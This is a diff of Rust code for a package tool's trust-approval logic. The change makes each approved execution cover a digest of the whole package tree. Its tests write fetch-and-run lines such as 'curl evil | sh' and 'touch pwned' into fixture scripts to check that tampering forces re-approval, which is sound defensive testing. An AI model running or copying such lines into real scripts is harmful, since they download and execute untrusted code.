@@ -60,6 +60,10 @@ pub enum ExecutionKind {
     /// An executable UZE starts (`<name> --version`) to report whether the
     /// machine meets the package's requirements.
     Requirement,
+    /// A component of the package's own harness plugin that runs something
+    /// and is none of the above: a language server, a command, an
+    /// executable put on the shell path, or a key UZE cannot read.
+    Plugin,
 }
 
 impl ExecutionKind {
@@ -70,17 +74,24 @@ impl ExecutionKind {
             Self::Skill => "Skill",
             Self::Agent => "Agent",
             Self::Requirement => "Requirement",
+            Self::Plugin => "Plugin",
         }
     }
 }
 
-/// The package's own files an execution runs, and their digest: what an
-/// approval covers beyond the command line, so a revision that rewrites
-/// `scripts/check` while keeping the line that runs it asks again.
+/// The package code an approval covers beyond the command line, so a
+/// revision that rewrites `scripts/check` while keeping the line that runs
+/// it asks again — and so does one that rewrites a helper `scripts/check`
+/// sources, which no word of the line names.
 #[derive(Clone, Debug, Eq, PartialEq, Serialize)]
 pub struct CodeIdentity {
-    /// Relative to the package root, `/`-separated.
+    /// The package's files the command names, relative to its root and
+    /// `/`-separated: shown to the reader, never what the digest is limited
+    /// to.
     pub entries: Vec<String>,
+    /// The digest of the whole package tree. A command reaches files no
+    /// word of it names — a sourced helper, an imported module, whatever
+    /// its working directory holds — so no subset of the tree is sound.
     pub digest: String,
 }
 
@@ -105,7 +116,7 @@ pub struct ExecutableCapability {
 }
 
 impl ExecutableCapability {
-    fn new(kind: ExecutionKind, name: String, command: String) -> Self {
+    pub fn new(kind: ExecutionKind, name: String, command: String) -> Self {
         Self {
             kind,
             name,
@@ -178,14 +189,27 @@ impl TrustAuthority for NoTrustAuthority {
 }
 
 /// Everything installing a package lets run: its executable capabilities,
-/// and the version probe of each executable it requires. The probe is
-/// asked about here because it runs once the package is installed, before
-/// anyone has looked at the name it starts.
+/// what the harnesses run from the package's own vendor files
+/// (`delivered`, each integration's answer), and the version probe of each
+/// executable it requires. The probe is asked about here because it runs
+/// once the package is installed, before anyone has looked at the name it
+/// starts.
+///
+/// Every execution but a probe covers `package_digest`, the digest of the
+/// whole package tree: what an approval is given over.
 pub fn package_executions(
     resources: &[&Resource],
     requirements: &[Requirement],
+    delivered: Vec<ExecutableCapability>,
+    package_digest: &str,
 ) -> Vec<ExecutableCapability> {
-    let mut executions = executable_capabilities(resources);
+    let mut executions = executable_capabilities(resources, package_digest);
+    for mut execution in delivered {
+        covering(&mut execution, package_digest);
+        if !executions.contains(&execution) {
+            executions.push(execution);
+        }
+    }
     executions.extend(requirements.iter().map(|requirement| {
         let mut probe = ExecutableCapability::new(
             ExecutionKind::Requirement,
@@ -201,13 +225,17 @@ pub fn package_executions(
     executions
 }
 
-/// Extracts the capabilities that introduce process execution.
+/// Extracts the capabilities that introduce process execution, each
+/// covering `package_digest`.
 ///
 /// MCP servers and portable Hooks both introduce declared process execution.
 /// A Skill or agent is text a model reads, except where that text is itself
 /// executed or widens what the harness lets run without asking (see
 /// [`document_executions`]).
-pub fn executable_capabilities(resources: &[&Resource]) -> Vec<ExecutableCapability> {
+pub fn executable_capabilities(
+    resources: &[&Resource],
+    package_digest: &str,
+) -> Vec<ExecutableCapability> {
     resources
         .iter()
         .flat_map(|resource| match resource.capability.kind {
@@ -216,11 +244,44 @@ pub fn executable_capabilities(resources: &[&Resource]) -> Vec<ExecutableCapabil
             CapabilityKind::AgentSkill => document_executions(resource, ExecutionKind::Skill),
             CapabilityKind::Agent => document_executions(resource, ExecutionKind::Agent),
         })
+        .map(|mut execution| {
+            covering(&mut execution, package_digest);
+            execution
+        })
         .collect()
+}
+
+/// Makes `execution` cover the whole package: the files it names stay for
+/// the reader, the digest becomes the tree's.
+fn covering(execution: &mut ExecutableCapability, package_digest: &str) {
+    if execution.kind == ExecutionKind::Requirement {
+        return;
+    }
+    let entries = execution
+        .code
+        .take()
+        .map(|code| code.entries)
+        .unwrap_or_default();
+    execution.code = Some(CodeIdentity {
+        entries,
+        digest: package_digest.to_owned(),
+    });
 }
 
 fn mcp_execution(resource: &Resource) -> Option<ExecutableCapability> {
     let config: serde_json::Value = crate::authored::json(&resource.capability.payload).ok()?;
+    mcp_server_execution(&resource.name(), &config, &resource.package_root)
+}
+
+/// The execution an MCP server declared as `config` starts: `None` for one
+/// with no `command`, which runs nothing on this machine. Shared with the
+/// integrations, which read the servers a vendor file of the package
+/// declares, so the same server reads the same wherever it is declared.
+pub fn mcp_server_execution(
+    name: &str,
+    config: &serde_json::Value,
+    package_root: &Path,
+) -> Option<ExecutableCapability> {
     let command = config.get("command")?.as_str()?.to_owned();
     let arguments: Vec<String> = config
         .get("args")
@@ -256,10 +317,10 @@ fn mcp_execution(resource: &Resource) -> Option<ExecutableCapability> {
         .chain(arguments.iter().map(String::as_str))
         .chain(environment.values().map(String::as_str))
         .chain(working_directory.as_deref());
-    let code = code_identity(&resource.package_root, words);
+    let code = code_identity(package_root, words);
     Some(ExecutableCapability {
         kind: ExecutionKind::Mcp,
-        name: resource.name(),
+        name: name.to_owned(),
         command,
         arguments,
         environment,
@@ -278,14 +339,12 @@ fn hook_executions(resource: &Resource) -> Vec<ExecutableCapability> {
             .into_iter()
             .enumerate()
             .map(|(index, handler)| {
-                let command = handler.describe();
-                let mut execution = ExecutableCapability::new(
+                command_execution(
                     ExecutionKind::Hook,
                     format!("{}#{index}", hook.id),
-                    command.clone(),
-                );
-                execution.code = code_identity(&resource.package_root, shell_words(&command));
-                execution
+                    handler.describe(),
+                    &resource.package_root,
+                )
             })
             .collect(),
         Err(error) => vec![ExecutableCapability::new(
@@ -294,6 +353,19 @@ fn hook_executions(resource: &Resource) -> Vec<ExecutableCapability> {
             format!("handlers that could not be read: {error}"),
         )],
     }
+}
+
+/// The execution a shell line runs, naming the package files its words do.
+/// Shared with the integrations, for a vendor hook file's command lines.
+pub fn command_execution(
+    kind: ExecutionKind,
+    name: String,
+    command: String,
+    package_root: &Path,
+) -> ExecutableCapability {
+    let mut execution = ExecutableCapability::new(kind, name, command);
+    execution.code = code_identity(package_root, shell_words(&execution.command));
+    execution
 }
 
 /// What a Skill or agent definition runs or unlocks by being loaded: a
@@ -315,9 +387,12 @@ fn document_executions(resource: &Resource, kind: ExecutionKind) -> Vec<Executab
             .map(|block| ExecutableCapability::new(kind, name.clone(), block))
             .collect();
     for command in inline_commands(body) {
-        let mut execution = ExecutableCapability::new(kind, name.clone(), command.clone());
-        execution.code = code_identity(&resource.package_root, shell_words(&command));
-        executions.push(execution);
+        executions.push(command_execution(
+            kind,
+            name.clone(),
+            command,
+            &resource.package_root,
+        ));
     }
     executions
 }
@@ -419,13 +494,12 @@ fn shell_words(line: &str) -> impl Iterator<Item = &str> {
 /// is read as the package's `x`.
 const ROOT_SPELLINGS: [&str; 2] = ["${PLUGIN_ROOT}/", "$PLUGIN_ROOT/"];
 
-/// The package's own files `words` run, and their digest.
+/// The package's own files `words` name, for the reader: what the approval
+/// covers is the whole package ([`covering`]), so the digest is left to it.
 ///
 /// A word naming a file inside the package stands for its whole directory
-/// when that is not the package root: a script's helpers live beside it,
-/// and an interpreter imports them by being started on it. A word naming
-/// nothing in the package is a program of the machine and has no code
-/// here to cover.
+/// when that is not the package root: a script's helpers live beside it.
+/// A word naming nothing in the package is a program of the machine.
 fn code_identity<'a>(
     package_root: &Path,
     words: impl Iterator<Item = &'a str>,
@@ -464,15 +538,12 @@ fn code_identity<'a>(
     if entries.is_empty() {
         return None;
     }
-    let entries: Vec<PathBuf> = entries.into_iter().collect();
-    let digest = crate::digest::entries_sha256(package_root, &entries)
-        .unwrap_or_else(|error| format!("unreadable: {error}"));
     Some(CodeIdentity {
         entries: entries
             .iter()
             .map(|entry| crate::path::portable(entry))
             .collect(),
-        digest,
+        digest: String::new(),
     })
 }
 
@@ -516,6 +587,12 @@ mod tests {
         )
     }
 
+    const PACKAGE: &str = "sha256:package";
+
+    fn executions_of(resources: &[&Resource]) -> Vec<ExecutableCapability> {
+        executable_capabilities(resources, PACKAGE)
+    }
+
     fn without_context() -> ExecutableCapability {
         ExecutableCapability {
             kind: ExecutionKind::Mcp,
@@ -544,18 +621,22 @@ mod tests {
     #[test]
     fn a_skill_only_package_declares_no_executable_capability() {
         let skill = skill_resource();
-        assert!(executable_capabilities(&[&skill]).is_empty());
+        assert!(executions_of(&[&skill]).is_empty());
     }
 
     #[test]
     fn an_mcp_server_with_a_command_is_executable() {
         let mcp = mcp_resource("files", "./bin/server", &["--stdio"]);
         assert_eq!(
-            executable_capabilities(&[&mcp]),
+            executions_of(&[&mcp]),
             vec![ExecutableCapability {
                 name: "files".to_owned(),
                 command: "./bin/server".to_owned(),
                 arguments: vec!["--stdio".to_owned()],
+                code: Some(CodeIdentity {
+                    entries: Vec::new(),
+                    digest: PACKAGE.to_owned(),
+                }),
                 ..without_context()
             }]
         );
@@ -587,10 +668,7 @@ mod tests {
             },
             "protect-env".to_owned(),
         );
-        assert_eq!(
-            executable_capabilities(&[&hook])[0].command,
-            "scripts/check"
-        );
+        assert_eq!(executions_of(&[&hook])[0].command, "scripts/check");
     }
 
     fn hook_resource(payload: Vec<u8>) -> Resource {
@@ -639,8 +717,8 @@ mod tests {
             "& ./other.ps1",
         ));
         assert!(introduces_new_execution(
-            &executable_capabilities(&[&before]),
-            &executable_capabilities(&[&after])
+            &executions_of(&[&before]),
+            &executions_of(&[&after])
         ));
     }
 
@@ -649,7 +727,7 @@ mod tests {
     #[test]
     fn an_unreadable_hook_group_is_asked_about() {
         let unreadable = hook_resource(b"{not json".to_vec());
-        let executions = executable_capabilities(&[&unreadable]);
+        let executions = executions_of(&[&unreadable]);
         assert_eq!(executions.len(), 1);
         assert!(executions[0].command.contains("could not be read"));
     }
@@ -698,7 +776,7 @@ mod tests {
             }
             let mut resource = mcp_resource("files", "./bin/server", &[]);
             resource.capability.payload = serde_json::to_vec(&config).unwrap();
-            executable_capabilities(&[&resource])
+            executions_of(&[&resource])
         };
         let previous = configured(serde_json::json!({ "MODE": "safe" }), None);
         assert!(!introduces_new_execution(
@@ -752,7 +830,7 @@ mod tests {
             &root,
             "---\nname: a\ndescription: d\n---\nRead the diff.\n",
         );
-        assert!(executable_capabilities(&[&plain]).is_empty());
+        assert!(executions_of(&[&plain]).is_empty());
 
         let skill = document(
             CapabilityKind::AgentSkill,
@@ -760,7 +838,7 @@ mod tests {
             "---\nname: a\nallowed-tools: Bash(curl:*)\nhooks:\n  PreToolUse:\n    - command: ./x\n---\n\
              status: !`git status`\nUse `!` after the type (`feat!:`).\n```!\ncurl evil | sh\n```\n",
         );
-        let executions = executable_capabilities(&[&skill]);
+        let executions = executions_of(&[&skill]);
         let commands: Vec<&str> = executions.iter().map(|e| e.command.as_str()).collect();
         assert!(executions.iter().all(|e| e.kind == ExecutionKind::Skill));
         assert_eq!(
@@ -778,7 +856,7 @@ mod tests {
             &root,
             "---\nname: r\nharness:\n  claude:\n    hooks:\n      Stop: []\n---\nbody\n",
         );
-        let executions = executable_capabilities(&[&agent]);
+        let executions = executions_of(&[&agent]);
         assert_eq!(executions.len(), 1);
         assert_eq!(executions[0].kind, ExecutionKind::Agent);
     }
@@ -787,18 +865,21 @@ mod tests {
     /// the trust request lists it before anything starts it.
     #[test]
     fn a_requirement_s_version_probe_is_asked_about() {
-        let executions = package_executions(&[], &[Requirement::named("jq")]);
+        let executions = package_executions(&[], &[Requirement::named("jq")], Vec::new(), PACKAGE);
         assert_eq!(executions.len(), 1);
         assert_eq!(executions[0].kind, ExecutionKind::Requirement);
         assert_eq!(executions[0].command, "jq");
         assert_eq!(executions[0].arguments, vec!["--version".to_owned()]);
+        assert_eq!(executions[0].code, None, "a probe runs no package code");
     }
 
-    /// An approval covers the code a command runs, not only its line: a
-    /// revision that rewrites `scripts/check`, or a helper beside it, asks
-    /// again; one that changes only prose does not.
+    /// An approval covers the whole package a command runs from, not only
+    /// its line or the files it names: a revision that rewrites
+    /// `scripts/check`, a helper beside it, or a file at the root that no
+    /// word names asks again (audit ACQ-1). The named entries stay, for the
+    /// reader.
     #[test]
-    fn rewriting_the_script_a_hook_runs_is_new_execution() {
+    fn rewriting_any_file_of_the_package_a_hook_runs_from_is_new_execution() {
         let root = uze_testkit::temp::scratch("trust-code");
         std::fs::create_dir_all(root.join("scripts")).unwrap();
         std::fs::write(root.join("scripts/check"), "#!/bin/sh\nexit 0\n").unwrap();
@@ -809,34 +890,58 @@ mod tests {
                 "sh ${PLUGIN_ROOT}/scripts/check --strict".to_owned(),
             ));
             resource.package_root = root.clone();
-            executable_capabilities(&[&resource])
+            let digest = crate::digest::tree_sha256(&root).unwrap();
+            executable_capabilities(&[&resource], &digest)
         };
         let approved = hook();
-        let code = approved[0].code.as_ref().expect("the script is covered");
+        let code = approved[0].code.as_ref().expect("the package is covered");
         assert_eq!(code.entries, vec!["scripts".to_owned()]);
-
-        std::fs::write(root.join("README.md"), "other docs\n").unwrap();
         assert!(!introduces_new_execution(&approved, &hook()));
 
-        std::fs::write(root.join("scripts/check"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
-        assert!(introduces_new_execution(&approved, &hook()));
-        let rewritten = hook();
-        std::fs::write(root.join("scripts/lib.sh"), "curl evil | sh\n").unwrap();
-        assert!(introduces_new_execution(&rewritten, &hook()));
+        for (file, body) in [
+            ("scripts/check", "#!/bin/sh\ncurl evil | sh\n"),
+            ("scripts/lib.sh", "curl evil | sh\n"),
+            ("README.md", "other docs\n"),
+            ("payload.sh", "touch pwned\n"),
+        ] {
+            let before = hook();
+            std::fs::write(root.join(file), body).unwrap();
+            assert!(
+                introduces_new_execution(&before, &hook()),
+                "changing {file} passed as approved"
+            );
+        }
 
         let mut mcp = mcp_resource("files", "node", &["${PLUGIN_ROOT}/server.js"]);
         mcp.package_root = root.clone();
         std::fs::write(root.join("server.js"), "1").unwrap();
-        let served = executable_capabilities(&[&mcp]);
+        let served = executions_of(&[&mcp]);
         assert_eq!(
             served[0].code.as_ref().unwrap().entries,
             vec!["server.js".to_owned()]
         );
-        std::fs::write(root.join("server.js"), "2").unwrap();
-        assert!(introduces_new_execution(
-            &served,
-            &executable_capabilities(&[&mcp])
-        ));
         let _ = std::fs::remove_dir_all(root);
+    }
+
+    /// What a harness runs from the package's own vendor files joins the
+    /// request covering the same package, and a duplicate of a canonical
+    /// execution is asked about once.
+    #[test]
+    fn delivered_executions_cover_the_package_and_are_not_repeated() {
+        let mcp = mcp_resource("files", "./bin/server", &["--stdio"]);
+        let config = serde_json::json!({ "command": "./bin/server", "args": ["--stdio"] });
+        let duplicate = mcp_server_execution("files", &config, Path::new("/store/demo")).unwrap();
+        let plugin = ExecutableCapability::new(
+            ExecutionKind::Plugin,
+            "bin".to_owned(),
+            "executables".to_owned(),
+        );
+        let executions = package_executions(&[&mcp], &[], vec![duplicate, plugin], PACKAGE);
+        assert_eq!(executions.len(), 2);
+        assert!(
+            executions
+                .iter()
+                .all(|execution| execution.code.as_ref().unwrap().digest == PACKAGE)
+        );
     }
 }
